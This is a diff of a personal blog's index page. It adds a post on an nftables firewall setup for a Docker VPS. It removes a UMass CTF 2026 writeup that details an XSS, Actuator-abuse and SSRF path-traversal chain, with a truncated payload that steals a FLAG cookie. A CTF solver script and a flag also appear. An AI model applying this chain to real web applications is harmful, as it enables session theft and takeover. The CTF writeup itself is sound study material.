@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">214</span>
+          <span class="site-state-item-count">215</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,135 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/linux/vps-nftables-docker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/linux/vps-nftables-docker/" class="post-title-link" itemprop="url">VPS nftables Firewall With Docker</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-05-10 14:10:00 / Modified: 15:04:12" itemprop="dateCreated datePublished" datetime="2026-05-10T14:10:00+08:00">2026-05-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/linux/vps-nftables-docker/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/vps-nftables-docker/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="vps-nftables-firewall-with-docker">VPS nftables Firewall With
+Docker</h1>
+<p>This note records a small <code>nftables</code> firewall setup for a
+VPS that also runs Docker.</p>
+<p>The goal is not to write a clever universal ruleset. The goal is
+simpler: keep the host <code>input</code> path small, expose only the
+ports that should be public, and avoid fighting Docker's own NAT
+rules.</p>
+<p>The example uses documentation IP addresses:</p>
+<ul>
+<li><code>203.0.113.10</code> as the admin's trusted IP</li>
+<li><code>198.51.100.20</code> as the server IP</li>
+<li><code>22222</code> as the SSH port</li>
+</ul>
+<p>Replace them with your own values.</p>
+<h2 id="basic-rules">Basic Rules</h2>
+<p>Use the <code>inet</code> family so the same table can handle IPv4
+and IPv6:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/sbin/nft -f</span><br><span class="line"></span><br><span class="line">flush ruleset</span><br><span class="line"></span><br><span class="line">table inet filter &#123;</span><br><span class="line">    set trusted_ipv4 &#123;</span><br><span class="line">        type ipv4_addr</span><br><span class="line">        flags interval</span><br><span class="line">        elements = &#123;</span><br><span class="line">            203.0.113.10,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chain input &#123;</span><br><span class="line">        type filter hook input priority filter; policy drop;</span><br><span class="line"></span><br><span class="line">        iif &quot;lo&quot; accept</span><br><span class="line">        ct state established,related accept</span><br><span class="line">        ct state invalid drop</span><br><span class="line"></span><br><span class="line">        ip protocol icmp accept</span><br><span class="line">        ip6 nexthdr icmpv6 accept</span><br><span class="line"></span><br><span class="line">        # SSH: only allow the trusted admin IP.</span><br><span class="line">        ip saddr @trusted_ipv4 tcp dport 22222 accept</span><br><span class="line"></span><br><span class="line">        # Public web entry.</span><br><span class="line">        tcp dport &#123; 80, 443 &#125; accept</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chain forward &#123;</span><br><span class="line">        type filter hook forward priority filter; policy accept;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chain output &#123;</span><br><span class="line">        type filter hook output priority filter; policy accept;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="docker-notes">Docker Notes</h2>
+<p>Docker manages its own forwarding and NAT rules. If you blindly flush
+everything and then set <code>forward</code> to <code>drop</code>,
+containers may lose network access or published ports may stop
+working.</p>
+<p>For a small VPS, I usually keep the boundary simple:</p>
+<ul>
+<li>protect the host through the <code>input</code> chain</li>
+<li>let Docker manage container NAT</li>
+<li>expose public services through Caddy on <code>80/443</code></li>
+<li>bind internal app ports to <code>127.0.0.1</code> when possible</li>
+</ul>
+<p>Example Docker port mapping:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;127.0.0.1:8080:8080&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Then let Caddy publish it over HTTPS.</p>
+<h2 id="apply-safely">Apply Safely</h2>
+<p>Validate before loading:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nft -c -f /etc/nftables.conf</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -2651,146 +2780,6 @@ character:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> kiutils.board <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_logic</span>():</span><br><span class="line">    board = Board.from_file(<span class="string">&#x27;smart-brick-v2.kicad_pcb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Map components by reference</span></span><br><span class="line">    components = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> fp <span class="keyword">in</span> board.footprints:</span><br><span class="line">        ref = fp.properties.get(<span class="string">&#x27;Reference&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        val = fp.properties.get(<span class="string">&#x27;Value&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        pins = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> pad <span class="keyword">in</span> fp.pads:</span><br><span class="line">            <span class="keyword">if</span> pad.net:</span><br><span class="line">                pins[pad.number] = pad.net.name</span><br><span class="line"></span><br><span class="line">        components[ref] = &#123;</span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: val,</span><br><span class="line">            <span class="string">&#x27;pins&#x27;</span>: pins</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define gate logic</span></span><br><span class="line">    <span class="comment"># (inputs, output)</span></span><br><span class="line">    gate_defs = &#123;</span><br><span class="line">        <span class="string">&#x27;74LS00&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># NAND</span></span><br><span class="line">        <span class="string">&#x27;74LS02&#x27;</span>: [((<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>), <span class="string">&#x27;1&#x27;</span>), ((<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>), <span class="string">&#x27;4&#x27;</span>), ((<span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>), <span class="string">&#x27;10&#x27;</span>), ((<span class="string">&#x27;11&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), <span class="string">&#x27;13&#x27;</span>)], <span class="comment"># NOR</span></span><br><span class="line">        <span class="string">&#x27;74LS04&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>,), <span class="string">&#x27;2&#x27;</span>), ((<span class="string">&#x27;3&#x27;</span>,), <span class="string">&#x27;4&#x27;</span>), ((<span class="string">&#x27;5&#x27;</span>,), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>,), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;11&#x27;</span>,), <span class="string">&#x27;10&#x27;</span>), ((<span class="string">&#x27;13&#x27;</span>,), <span class="string">&#x27;12&#x27;</span>)], <span class="comment"># NOT</span></span><br><span class="line">        <span class="string">&#x27;74LS08&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># AND</span></span><br><span class="line">        <span class="string">&#x27;74LS20&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;8&#x27;</span>)], <span class="comment"># NAND 4</span></span><br><span class="line">        <span class="string">&#x27;74LS21&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;8&#x27;</span>)], <span class="comment"># AND 4</span></span><br><span class="line">        <span class="string">&#x27;74LS27&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;12&#x27;</span>), ((<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;11&#x27;</span>), <span class="string">&#x27;8&#x27;</span>)], <span class="comment"># NOR 3</span></span><br><span class="line">        <span class="string">&#x27;74LS32&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># OR</span></span><br><span class="line">        <span class="string">&#x27;74LS86&#x27;</span>: [((<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>), <span class="string">&#x27;3&#x27;</span>), ((<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>), <span class="string">&#x27;6&#x27;</span>), ((<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>), <span class="string">&#x27;8&#x27;</span>), ((<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>), <span class="string">&#x27;11&#x27;</span>)], <span class="comment"># XOR</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build the net dependency graph</span></span><br><span class="line">    net_logic = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ref, comp <span class="keyword">in</span> components.items():</span><br><span class="line">        val = comp[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val <span class="keyword">in</span> gate_defs:</span><br><span class="line">            <span class="keyword">for</span> inputs, output <span class="keyword">in</span> gate_defs[val]:</span><br><span class="line">                <span class="keyword">if</span> output <span class="keyword">in</span> comp[<span class="string">&#x27;pins&#x27;</span>]:</span><br><span class="line">                    out_net = comp[<span class="string">&#x27;pins&#x27;</span>][output]</span><br><span class="line">                    in_nets = [comp[<span class="string">&#x27;pins&#x27;</span>][i] <span class="keyword">for</span> i <span class="keyword">in</span> inputs <span class="keyword">if</span> i <span class="keyword">in</span> comp[<span class="string">&#x27;pins&#x27;</span>]]</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(in_nets) == <span class="built_in">len</span>(inputs):</span><br><span class="line">                        op = val[<span class="number">4</span>:] <span class="comment"># 00, 02, etc.</span></span><br><span class="line">                        net_logic[out_net] = (op, in_nets)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># MOSFET gates driving LEDs</span></span><br><span class="line">    led_nets = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        ref = <span class="string">f&#x27;Q<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> ref <span class="keyword">in</span> components:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> components[ref][<span class="string">&#x27;pins&#x27;</span>]:</span><br><span class="line">                led_nets.append(components[ref][<span class="string">&#x27;pins&#x27;</span>][<span class="string">&#x27;1&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Simulation function</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">simulate</span>(<span class="params">inputs_bits</span>):</span><br><span class="line">        vals = &#123;<span class="string">f&#x27;/IN<span class="subst">&#123;i&#125;</span>&#x27;</span>: inputs_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)&#125;</span><br><span class="line">        vals[<span class="string">&#x27;GND&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">        vals[<span class="string">&#x27;+5V&#x27;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        memo = &#123;&#125;</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_val</span>(<span class="params">net</span>):</span><br><span class="line">            <span class="keyword">if</span> net <span class="keyword">in</span> vals: <span class="keyword">return</span> vals[net]</span><br><span class="line">            <span class="keyword">if</span> net <span class="keyword">in</span> memo: <span class="keyword">return</span> memo[net]</span><br><span class="line">            <span class="keyword">if</span> net <span class="keyword">not</span> <span class="keyword">in</span> net_logic: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            op, ins = net_logic[net]</span><br><span class="line">            in_vals = [get_val(i) <span class="keyword">for</span> i <span class="keyword">in</span> ins]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;00&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> (in_vals[<span class="number">0</span>] <span class="keyword">and</span> in_vals[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;02&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> (in_vals[<span class="number">0</span>] <span class="keyword">or</span> in_vals[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;04&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> in_vals[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;08&#x27;</span>: <span class="keyword">return</span> in_vals[<span class="number">0</span>] <span class="keyword">and</span> in_vals[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;20&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">all</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;21&#x27;</span>: <span class="keyword">return</span> <span class="built_in">all</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;27&#x27;</span>: <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">any</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;32&#x27;</span>: <span class="keyword">return</span> <span class="built_in">any</span>(in_vals)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;86&#x27;</span>: <span class="keyword">return</span> in_vals[<span class="number">0</span>] ^ in_vals[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            memo[net] = res</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [get_val(ln) <span class="keyword">for</span> ln <span class="keyword">in</span> led_nets]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Brute force 7-bit ASCII</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;LED <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            bits = [(code &gt;&gt; j) &amp; <span class="number">1</span> == <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">            outputs = simulate(bits)</span><br><span class="line">            <span class="keyword">if</span> outputs[i]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(code)&#125;</span>&#x27; (0x<span class="subst">&#123;code:02x&#125;</span>)&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">get_logic()</span><br></pre></td></tr></table></figure>
 <h3 id="flag">Flag</h3>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{In_Th3_G4t3s}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-the-block-city-times/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-the-block-city-times/" class="post-title-link" itemprop="url">UMass CTF 2026 - The Block City Times</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 19:53:50 / Modified: 21:01:58" itemprop="dateCreated datePublished" datetime="2026-04-13T19:53:50+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-the-block-city-times/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-the-block-city-times/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>The Block City Times is here to inform you!</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>"The Block City Times" is a complex web application built with Spring
-Boot, involving multiple internal services (<code>editorial</code>,
-<code>report-runner</code>) and a Puppeteer-based bot. The challenge
-requires chaining several vulnerabilities to leak a sensitive
-<code>FLAG</code> cookie from an internal diagnostic service.</p>
-<h3 id="solution">Solution</h3>
-<p>The attack follows a multi-stage exploit chain:</p>
-<ol type="1">
-<li><p><strong>Arbitrary File Upload &amp; XSS</strong>: The
-<code>/submit</code> endpoint allows uploading "story" files. Although
-it checks the <code>Content-Type</code>, this is easily bypassed. Files
-are saved with their original extension and served via
-<code>/files/&#123;filename&#125;</code>. By uploading an <code>.html</code> file
-with <code>Content-Type: text/plain</code>, we can achieve stored
-XSS.</p></li>
-<li><p><strong>Administrative Bot Triggering</strong>: The
-<code>editorial</code> service automatically reviews every submission by
-visiting the uploaded file as an administrator. This allows our XSS
-payload to execute with administrative privileges.</p></li>
-<li><p><strong>Actuator Abuse</strong>: The application exposes Spring
-Boot Actuator endpoints. Via XSS, the <code>editorial</code> bot can be
-forced to modify application properties at runtime:</p>
-<ul>
-<li>Disable production enforcement: <code>POST /actuator/env</code> with
-<code>app.enforce-production=false</code>.</li>
-<li>Switch to dev mode: <code>POST /admin/switch?config=dev</code>.</li>
-</ul></li>
-<li><p><strong>SSRF &amp; Cookie Leakage</strong>: The
-<code>report-runner</code> service logs in as an admin, sets a
-<code>FLAG</code> cookie, and visits a user-specified API endpoint.
-While it checks if the endpoint starts with <code>/api/</code>, this can
-be bypassed with path traversal (e.g.,
-<code>/api/../files/exploit.html</code>).</p></li>
-</ol>
-<h4 id="exploit-payload-exploit.html">Exploit Payload
-(<code>exploit.html</code>)</h4>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  (<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">ms</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> filename = location.<span class="property">pathname</span>.<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// STAGE 2: If visited by report-runner, leak the flag to article tags</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">includes</span>(<span class="string">&quot;FLAG=&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/tags/article/1&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;PUT&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>([<span class="variable language_">document</span>.<span class="property">cookie</span>]),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span 